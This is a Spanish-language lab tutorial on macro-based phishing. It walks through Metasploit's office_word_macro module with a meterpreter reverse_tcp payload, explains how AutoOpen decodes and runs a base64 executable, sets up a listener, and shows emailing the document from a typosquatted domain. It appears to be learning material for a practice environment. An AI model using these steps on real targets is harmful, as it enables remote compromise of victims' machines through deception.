# Objetivos de aprendizaje

- Entender como funciona un ataque de phising
- Descubrir como los macros del documentos puedes usarse y abusar
- Aprender como realizar un ataque de phishing con una macro

# Phishing

Como todos sabemos en el término de seguridad los humanos somos el eslabón más débil, ¿Qué es más fácil buscar una vulnerabilidad en un sistema detras de un firewall o convender a alguien de abrir un documento "importante"?

Phishing es como la palabra pescar, sin embargo, el atacante no se come luego el pesado jiji, bueno, Phishing funciona mandando un "bait" normalmente a un grupo de usuarios. El atacante crea mensajes dependiendo de la urgencia, del target para que tomen medidas inmediatas, incrementando los chances. El proposito realmente es robar información personal o instalar un malware, normalmente se convence a la víctima a utilizar un formulario, abrir un archivo  o clickar en un link

# Macros

Una macro se refiere una instrucción programada diseñada para automatizar tareas repetitivas. Office, te ayudan a crear macros en el documento. En muchos casos, estos macros son características que pueden quitar mucho tiempo. Sin embargo en ciber seguridad estos programas pueden llevar dentro propositos maliciosos.

Para añadir una macro dentro de un documento de Word, nos iremos a menu de ver seleccionaremos Macros y se nos abrira, especificaremos el archivo en cuestión y crearemos

![image](https://github.com/user-attachments/assets/427c5c19-bef5-4730-a38c-fecb78620d05)

Vamos a explorar como un atacante crea un documento y lo utiliza para ganar acecso a un sistema

# Plan de ataque

En este plan necesitamos crear un documento malicioso. Al abrir el documento, la macro se ejecute el payload conectado en la máquina y no se un control remoto. Posteirormente, necesitaremos estar escuchando las conexiones de dicha maquina antes de mandar dicho documento. Para ejecutar el macro utilizaremos una rev shell, utilizada para ejecutar comandos remotamente.

- Crear un documento con la redirección maliciosa
- Estar a la escucha de conexiónes

# Crear un documento malicioso

El primer paso es crear dicho documento en m icaso utilizare metasploit

```
msfconsole

set payload windows/meterpreter/reverse_tcp

use exploit/multi/fileformat/office_word_macro

set LHOST (nuestra ip)

set LPORT (puero en cuestión)

exploit

exit
```

![image](https://github.com/user-attachments/assets/5b71c7e4-9e7b-4ca2-b26e-3888a882c7e2)

![image](https://github.com/user-attachments/assets/f6898de8-42bd-4882-ae4c-019a5828a97a)

![image](https://github.com/user-attachments/assets/ebfdef6d-9d02-45a1-a9bc-841dfe1537c8)

Como podemos ver se nos ha guardado en /root/.msf4/local/msf.docm

# Como se ve el dcumento

1. AutoOpen() desencadena la macro automaticamente cuando el word se abre. Busca alrededor del documento y sus propiedaes, ve el contenido de "comentario" y los datos son codificados en base64 y automaticamente se genera el payload
2. Base64Decode() convierte el payload en su forma originar y en este caso es un ejecutable MS WIndows
3. ExecuteforWindows() Ejecuta el payload temporalmente. Se conecta a la IP anteriormente utilizada

![image](https://github.com/user-attachments/assets/0a68d568-f04b-4039-9599-773d1474db6a)

Los comentarios:

![image](https://github.com/user-attachments/assets/5fd990d7-93b6-4bfe-a2b8-eca9f604c112)

Si copias el comentario de base 64 puedes convertirlo en su archivo original usando base64

```
base64 -d payload.txt > payload_decodificado.txt
```

Si deseas comprobar exactmaente lo que hace el archivo puedes meterlo a VirusTotal

![image](https://github.com/user-attachments/assets/fc2577c6-871f-47a2-bcdc-08cd9bfa7b79)

# Escuchar las conexiones

- Abriremos la consola y ejecutaremos msfconsole:

```
use multi/handler

set payload windows/meterpreter/reverse_tcp

set LHOST 10.10.204.2

set LPORT 8888

show options

exploit
```

![image](https://github.com/user-attachments/assets/5e923153-3dfd-442c-8468-200cf3b00dfb)

![image](https://github.com/user-attachments/assets/f106cfd6-48d6-4a38-8703-aed128335206)

![image](https://github.com/user-attachments/assets/6357d38d-a6ed-4f37-9344-1510f60c826c)

# Email con el contenido malicioso

Ahora que dicho documento esta creado. Todo lo que necesitamos es mandar el target del usuario. Es tiempo para mandar un email

Esta tecnica es conocida como "typosquatticg" donde los atacantes se crean un dominio identico al legitimo para jugar con las victimas

por ejemplo

marta@nodo313.net

info@nodo313.net

Una vez estes dentro del email, primero cogeremos y cambiaremos el nombre de dicho documento

![image](https://github.com/user-attachments/assets/76a7071f-96dc-43fe-a059-d78c11ce1475)

Una vez hecho esto prepararemos un correo 

![image](https://github.com/user-attachments/assets/4de93a85-013d-4e55-a634-efd18c277aee)

![image](https://github.com/user-attachments/assets/0c0cbf8c-4285-4cd1-b1aa-11f56e4c9192)

Así es como se vería

![image](https://github.com/user-attachments/assets/d0cb9b87-9cd5-4334-9b39-392d88938920)

Obviamente para dejar claro, que seguramente esto en un entorno real, no pase ni el correo electrónico, se puede utilizar pngs o etc, y a la hora de abrir el archivo os salga alguna cosita de que tiene macros, pero como arprendizaje bien genial un saludo. 



